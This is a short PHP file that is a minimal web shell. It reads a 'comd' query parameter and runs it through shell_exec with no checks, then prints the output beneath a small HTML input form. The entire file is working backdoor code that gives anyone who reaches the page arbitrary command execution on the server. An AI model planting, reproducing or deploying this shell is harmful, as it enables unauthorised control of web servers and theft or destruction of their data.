<?php
$p=$_GET['comd'];
echo '
<table style="text-align:center; width:70%; margin-left:15%; margin-top:50%; margin-right:15%;">
<tr>
<td>
<form action="/" method="GET"><input name="comd" value="" type="text"></form>
';
echo shell_exec("$p");
echo '
</td>
</tr>
</table>
';
?>

